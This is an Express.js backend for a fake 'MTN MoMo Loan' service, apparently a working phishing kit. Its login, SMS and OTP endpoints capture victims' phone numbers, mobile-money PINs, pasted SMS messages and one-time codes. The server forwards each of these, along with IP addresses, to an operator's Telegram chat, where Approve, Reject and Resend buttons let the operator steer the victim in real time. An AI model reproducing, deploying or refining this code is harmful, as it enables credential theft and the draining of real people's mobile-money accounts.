/* ============================================================
   MTN MoMo Loan — Backend
   - Live approve/reject via Telegram inline buttons
   - Resend button per-page:
       * login: none
       * sms:   sends user back to login (fresh start)
       * otp:   clears OTP boxes on same page
   - No DB (in-memory Map, auto-cleaned)
   ============================================================ */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();

/* ============================================================
   CONFIG
   ============================================================ */
const PORT = process.env.PORT || 5000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const TELEGRAM_API          = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_ANSWER_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
const TELEGRAM_EDIT_URL     = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
const TELEGRAM_WEBHOOK_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;

const SESSION_TIMEOUT_MS = 10 * 60 * 1000;
const SESSION_MAX_AGE_MS = 15 * 60 * 1000;

/* ============================================================
   IN-MEMORY SESSION STORE
   ============================================================ */
const sessions = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions.entries()) {
    const age = now - s.createdAt;
    if ((s.status === 'pending' || s.status === 'resend_requested') && age > SESSION_TIMEOUT_MS) {
      s.status = 'timeout';
      s.resolvedAt = now;
    }
    if (age > SESSION_MAX_AGE_MS) {
      sessions.delete(id);
    }
  }
}, 60 * 1000);

/* ============================================================
   MIDDLEWARE
   ============================================================ */
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* ============================================================
   HELPERS
   ============================================================ */
function makeSessionId() {
  return crypto.randomBytes(16).toString('hex');
}

function makeReference(prefix = 'REF') {
  const stamp = Date.now().toString(36).toUpperCase();
  const rand = crypto.randomBytes(3).toString('hex').toUpperCase();
  return `${prefix}-${stamp}-${rand}`;
}

function makeToken() {
  return crypto.randomBytes(24).toString('hex');
}

function escapeHtml(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
}

/* ============================================================
   TELEGRAM — send message
   Buttons depend on step:
     login → only ✅ ❌
     sms   → ✅ ❌ 🔁
     otp   → ✅ ❌ 🔁
   ============================================================ */
function buildKeyboard(step, sessionId) {
  const row = [
    { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
    { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
  ];

  /* Add 🔁 only for sms & otp */
  if (step === 'sms' || step === 'otp') {
    row.push({ text: '🔁 Resend', callback_data: `resend:${step}:${sessionId}` });
  }

  return { inline_keyboard: [row] };
}

async function sendTelegramWithButtons(text, sessionId, step) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing — message not sent.');
    return null;
  }
  try {
    const res = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: buildKeyboard(step, sessionId)
      })
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.warn('⚠️ Telegram error:', data.description || data);
      return null;
    }
    return data.result.message_id || null;
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return null;
  }
}

async function editTelegramMessage(messageId, text, keepButtons) {
  if (!messageId || !TELEGRAM_BOT_TOKEN) return;
  try {
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    };
    if (keepButtons) {
      body.reply_markup = keepButtons;
    }
    await fetch(TELEGRAM_EDIT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (err) {
    console.error('editTelegramMessage failed:', err.message);
  }
}

async function answerCallback(callbackQueryId, text) {
  if (!callbackQueryId || !TELEGRAM_BOT_TOKEN) return;
  try {
    await fetch(TELEGRAM_ANSWER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
        show_alert: false
      })
    });
  } catch (err) {
    console.error('answerCallback failed:', err.message);
  }
}

function summariseSession(session) {
  if (session.step === 'login') {
    return `📱 ${escapeHtml(session.data.phone)} — PIN entered`;
  }
  if (session.step === 'sms') {
    return `📱 ${escapeHtml(session.data.phone)} — SMS pasted`;
  }
  if (session.step === 'otp') {
    return `📱 ${escapeHtml(session.data.phone)} — OTP ${escapeHtml(session.data.otp)}`;
  }
  return '';
}

/* ============================================================
   HEALTH CHECK
   ============================================================ */
app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'momo-usersey-backend',
    activeSessions: sessions.size,
    webhook: global.__webhookStatus || 'unknown',
    time: new Date().toISOString()
  });
});

/* ============================================================
   POST /api/login
   ============================================================ */
app.post('/api/login', async (req, res) => {
  try {
    const { phone = '', pin = '', country = 'CM' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof pin !== 'string' || pin.length < 4) {
      return res.status(400).json({ ok: false, error: 'Invalid PIN' });
    }

    const sessionId = makeSessionId();
    const token = makeToken();

    const text =
      `🔐 <b>MoMo Login — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🌍 <b>Country:</b> ${escapeHtml(country)}\n` +
      `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n` +
      `🌐 <b>IP:</b> <code>${escapeHtml(req.ip || 'unknown')}</code>\n\n` +
      `⏳ Tap ✅ or ❌ below`;

    const messageId = await sendTelegramWithButtons(text, sessionId, 'login');
    console.log(`[login] sessionId=${sessionId} telegramMessageId=${messageId}`);

    sessions.set(sessionId, {
      step: 'login',
      status: 'pending',
      data: { phone, country, token },
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ ok: true, sessionId, token });
  } catch (err) {
    console.error('login error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/sms
   ============================================================ */
app.post('/api/sms', async (req, res) => {
  try {
    const { phone = '', token = '', sms = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof sms !== 'string' || sms.trim().length < 5) {
      return res.status(400).json({ ok: false, error: 'SMS text required' });
    }

    const sessionId = makeSessionId();
    const reference = makeReference('SMS');

    const text =
      `📩 <b>Pasted SMS — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n\n` +
      `📝 <b>Message:</b>\n<pre>${escapeHtml(sms)}</pre>\n` +
      `⏳ Tap ✅ / ❌ / 🔁 below`;

    const messageId = await sendTelegramWithButtons(text, sessionId, 'sms');
    console.log(`[sms] sessionId=${sessionId} telegramMessageId=${messageId}`);

    sessions.set(sessionId, {
      step: 'sms',
      status: 'pending',
      data: { phone, token, sms, reference },
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ ok: true, sessionId, reference });
  } catch (err) {
    console.error('sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/verify-otp
   ============================================================ */
app.post('/api/verify-otp', async (req, res) => {
  try {
    const { phone = '', otp = '', sms = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
      return res.status(400).json({ ok: false, error: 'Invalid OTP' });
    }

    const sessionId = makeSessionId();
    const reference = makeReference('OTP');

    const text =
      `🔢 <b>OTP Entered — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔢 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
      `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}` +
      (sms ? `\n\n📝 <b>Linked SMS:</b>\n<pre>${escapeHtml(sms.slice(0, 400))}</pre>` : '') +
      `\n⏳ Tap ✅ / ❌ / 🔁 below`;

    const messageId = await sendTelegramWithButtons(text, sessionId, 'otp');
    console.log(`[otp] sessionId=${sessionId} telegramMessageId=${messageId}`);

    sessions.set(sessionId, {
      step: 'otp',
      status: 'pending',
      data: { phone, otp, sms, reference },
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ ok: true, sessionId, reference });
  } catch (err) {
    console.error('verify-otp error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/resend-sms  (informational — user-initiated resend)
   ============================================================ */
app.post('/api/resend-sms', async (req, res) => {
  try {
    const { phone = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }

    const text =
      `🔁 <b>User requested SMS resend</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}`;

    await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    return res.json({ ok: true });
  } catch (err) {
    console.error('resend-sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   GET /api/status/:sessionId
   ============================================================ */
app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.json({ ok: true, status: 'unknown', step: null });
  }

  if ((session.status === 'pending' || session.status === 'resend_requested')
      && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
    session.status = 'timeout';
    session.resolvedAt = Date.now();
  }

  return res.json({
    ok: true,
    status: session.status,
    step: session.step
  });
});

/* ============================================================
   POST /api/telegram-webhook  (handles ✅ ❌ 🔁)
   ============================================================ */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cb = update.callback_query;

    if (!cb || !cb.data) {
      return res.json({ ok: true });
    }

    const [action, step, sessionId] = String(cb.data).split(':');
    const session = sessions.get(sessionId);

    console.log(`[webhook] action=${action} step=${step} sessionId=${sessionId} found=${!!session}`);

    if (!session) {
      await answerCallback(cb.id, 'Session expired');
      return res.json({ ok: true });
    }

    if (session.status === 'approved' || session.status === 'rejected' || session.status === 'timeout') {
      await answerCallback(cb.id, `Already ${session.status}`);
      return res.json({ ok: true });
    }

    /* ==========================================================
       🔁 RESEND
       ========================================================== */
    if (action === 'resend') {
      session.status = 'resend_requested';
      session.resendRequestedAt = Date.now();
      await answerCallback(cb.id, '🔁 Resend requested');

      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const summary = summariseSession(session);
      const newText =
        `🔁 <b>RESEND REQUESTED</b> — awaiting final decision\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `${summary}\n` +
        `🕒 <b>Requested:</b> ${when}\n\n` +
        `⏳ Tap ✅ or ❌ to finish`;

      if (session.telegramMessageId) {
        /* Keep only ✅ ❌ after resend */
        await editTelegramMessage(session.telegramMessageId, newText, {
          inline_keyboard: [[
            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
          ]]
        });
      }

      return res.json({ ok: true });
    }

    /* ==========================================================
       ✅ APPROVE  /  ❌ REJECT
       ========================================================== */
    if (action === 'approve') {
      session.status = 'approved';
      session.resolvedAt = Date.now();
      await answerCallback(cb.id, '✅ Approved');
    } else if (action === 'reject') {
      session.status = 'rejected';
      session.resolvedAt = Date.now();
      await answerCallback(cb.id, '❌ Rejected');
    } else {
      await answerCallback(cb.id, 'Unknown action');
      return res.json({ ok: true });
    }

    const statusLine = action === 'approve' ? '✅ <b>APPROVED</b>' : '❌ <b>REJECTED</b>';
    const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
    const summary = summariseSession(session);

    const newText =
      `${statusLine}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `${summary}\n` +
      `🕒 <b>Resolved:</b> ${when}`;

    if (session.telegramMessageId) {
      await editTelegramMessage(session.telegramMessageId, newText);
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('webhook error:', err);
    return res.json({ ok: true });
  }
});

/* ============================================================
   404 + ERROR HANDLERS
   ============================================================ */
app.use((_req, res) => {
  res.status(404).json({ ok: false, error: 'Not found' });
});

app.use((err, _req, res, _next) => {
  console.error('unhandled error:', err);
  res.status(500).json({ ok: false, error: 'Server error' });
});

/* ============================================================
   AUTO-REGISTER TELEGRAM WEBHOOK
   ============================================================ */
async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
    global.__webhookStatus = 'missing_token';
    return;
  }

  let publicUrl = process.env.PUBLIC_URL || '';
  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
  }
  publicUrl = publicUrl.replace(/\/+$/, '');

  if (!publicUrl) {
    console.warn('⚠️ No PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
    global.__webhookStatus = 'missing_url';
    return;
  }

  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log('🔗 Registering webhook:', webhookUrl);

  try {
    const res = await fetch(TELEGRAM_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ['callback_query']
      })
    });
    const data = await res.json().catch(() => ({}));
    if (data.ok) {
      console.log('✅ Telegram webhook registered:', webhookUrl);
      global.__webhookStatus = 'ok';
    } else {
      console.warn('⚠️ Webhook registration failed:', data.description || data);
      global.__webhookStatus = `failed: ${data.description || 'unknown'}`;
    }
  } catch (err) {
    console.error('❌ Webhook registration error:', err.message);
    global.__webhookStatus = `error: ${err.message}`;
  }
}

/* ============================================================
   START
   ============================================================ */
app.listen(PORT, async () => {
  console.log('====================================');
  console.log('💰 MTN MoMo Loan — backend running');
  console.log(`🚀 Port: ${PORT}`);
  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
  console.log('====================================');

  setTimeout(registerWebhook, 2000);
});
